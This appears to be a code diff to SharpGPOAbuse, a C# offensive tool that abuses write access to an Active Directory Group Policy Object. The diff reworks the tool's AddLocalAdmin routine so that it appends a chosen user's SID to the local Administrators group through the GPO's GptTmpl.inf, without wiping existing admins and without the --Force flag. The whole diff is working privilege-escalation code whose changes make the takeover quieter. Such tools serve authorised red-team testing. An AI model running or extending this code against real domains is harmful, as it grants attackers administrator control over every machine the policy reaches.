@@ -90,7 +90,7 @@ namespace SharpGPOAbuse
                 "--AddUserRights\n" +
                 "\tAdd rights to a user account\n" +
                 "--AddLocalAdmin\n" +
-                "\tAdd a new local admin. This will replace any existing local admins!\n" +
+                "\tAdd a user to the local Administrators group (additive - existing admins are preserved).\n" +
                 "--AddComputerScript\n" +
                 "\tAdd a new computer startup script\n" +
                 "--AddUserScript\n" +
@@ -611,7 +611,19 @@ Unicode=yes
 signature=""$CHICAGO$""
 Revision=1";
 
-            string[] text = { "[Group Membership]", "*S-1-5-32-544__Memberof =", "*S-1-5-32-544__Members = *" + usr.Sid.Value };
+            // Administrators = S-1-5-32-544. Use the ADDITIVE "__Memberof" form keyed on the TARGET
+            // user's SID so the account is ADDED to the local Administrators group without removing any
+            // existing members. The old "*S-1-5-32-544__Members = *SID" form is ENFORCING and would
+            // replace the entire Administrators membership, wiping every current admin (upstream issue #11).
+            const string adminsSid = "S-1-5-32-544";
+            const string sectionHeader = "[Group Membership]";
+            string memberofLine = "*" + usr.Sid.Value + "__Memberof = *" + adminsSid;
+            string membersLine = "*" + usr.Sid.Value + "__Members =";
+
+            if (Force)
+            {
+                Console.WriteLine("[*] --Force is no longer required for --AddLocalAdmin; the change is now additive and non-destructive.");
+            }
 
             String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
             String GPT_path = path + "\\GPT.ini";
@@ -633,85 +645,74 @@ Revision=1";
                 System.IO.Directory.CreateDirectory(path);
             }
             path += "GptTmpl.inf";
-            if (File.Exists(path))
+
+            // GptTmpl.inf does not exist yet: create it from scratch with our additive entry.
+            if (!File.Exists(path))
             {
-                bool exists = false;
-                Console.WriteLine("[+] File exists: " + path);
-                string[] readText = File.ReadAllLines(path);
+                Console.WriteLine("[+] Creating file " + path);
+                System.IO.File.WriteAllText(path, start + Environment.NewLine + sectionHeader + Environment.NewLine + memberofLine + Environment.NewLine + membersLine);
+                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+                return;
+            }
 
-                foreach (string s in readText)
-                {
-                    // Check if memberships are defined via group policy
-                    if (s.Contains("[Group Membership]"))
-                    {
-                        exists = true;
-                    }
-                }
+            Console.WriteLine("[+] File exists: " + path);
+            List<string> lines = new List<string>(File.ReadAllLines(path));
 
-                // if memberships are defined and force is NOT used
-                if (exists && !Force)
+            // Idempotency: if this user is already added to Administrators via this GPO, do nothing.
+            string normalizedTarget = memberofLine.Replace(" ", "");
+            foreach (string l in lines)
+            {
+                if (l.Replace(" ", "").Equals(normalizedTarget, StringComparison.OrdinalIgnoreCase))
                 {
-                    Console.WriteLine("[!] Group Memberships are already defined in the GPO. Use --force to make changes. This option might break the affected systems!\n[-] Exiting...");
-                    System.Environment.Exit(0);
+                    Console.WriteLine("[+] " + UserAccount + " is already a member of local Administrators via this GPO. No changes made.\n[+] Done!");
+                    return;
                 }
+            }
 
-                // if memberships are defined and force is used
-                if (exists && Force)
+            // Informational: warn if the GPO already ENFORCES the Administrators membership. Our change
+            // only adds the target account and never removes anyone, but the operator should know.
+            string enforcingPrefix = ("*" + adminsSid + "__Members=");
+            foreach (string l in lines)
+            {
+                string n = l.Replace(" ", "");
+                if (n.StartsWith(enforcingPrefix, StringComparison.OrdinalIgnoreCase) && n.Length > enforcingPrefix.Length)
                 {
-                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
-                    {
-                        foreach (string l in readText)
-                        {
-                            if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members="))
-                            {
-                                if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") > 0))
-                                {
-                                    file2.WriteLine(l + ", *" + usr.Sid.Value);
-                                }
-                                else if (l.Replace(" ", "").Contains("*S-1-5-32-544__Members=") && (string.Compare(l.Replace(" ", ""), "*S-1-5-32-544__Members=") == 0))
-                                {
-                                    file2.WriteLine(l + " *" + usr.Sid.Value);
-                                }
-                            }
-                            else
-                            {
-                                file2.WriteLine(l);
-                            }
-                        }
-                    }
-                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
-                    System.Environment.Exit(0);
+                    Console.WriteLine("[!] Note: this GPO already enforces the Administrators membership via \"__Members\". The target is being ADDED via \"__Memberof\"; existing members are preserved.");
+                    break;
                 }
+            }
 
-                // if memberships are not defined
-                if (!exists)
+            // Find the [Group Membership] section header (case-insensitive, ignoring spaces).
+            int sectionIndex = -1;
+            string normalizedHeader = sectionHeader.Replace(" ", "");
+            for (int i = 0; i < lines.Count; i++)
+            {
+                if (lines[i].Replace(" ", "").Equals(normalizedHeader, StringComparison.OrdinalIgnoreCase))
                 {
-                    Console.WriteLine("[+] The GPO does not specify any group memberships.");
-                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
-                    {
-                        foreach (string l in readText)
-                        {
-                            file2.WriteLine(l);
-                        }
-                        foreach (string l in text)
-                        {
-                            file2.WriteLine(l);
-                        }
-                    }
-                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+                    sectionIndex = i;
+                    break;
                 }
+            }
+
+            if (sectionIndex == -1)
+            {
+                // No restricted-groups section yet: append one. All existing settings are preserved.
+                Console.WriteLine("[+] The GPO does not specify any group memberships. Adding " + UserAccount + " to local Administrators...");
+                lines.Add(sectionHeader);
+                lines.Add(memberofLine);
+                lines.Add(membersLine);
             }
             else
             {
-                Console.WriteLine("[+] Creating file " + path);
-                String new_text = null;
-                foreach (String x in text)
-                {
-                    new_text += Environment.NewLine + x;
-                }
-                System.IO.File.WriteAllText(path, start + new_text);
-                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+                // Section exists: insert our additive entries directly after the header, leaving every
+                // existing entry untouched.
+                Console.WriteLine("[+] Group memberships already defined. Adding " + UserAccount + " to local Administrators without removing existing members...");
+                lines.Insert(sectionIndex + 1, membersLine);
+                lines.Insert(sectionIndex + 1, memberofLine);
             }
+
+            System.IO.File.WriteAllLines(path, lines.ToArray());
+            UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
         }
 
         public static void NewStartupScript(String ScriptName, String ScriptContents, String Domain, String DomainController, String GPOName, String distinguished_name, String objectType)
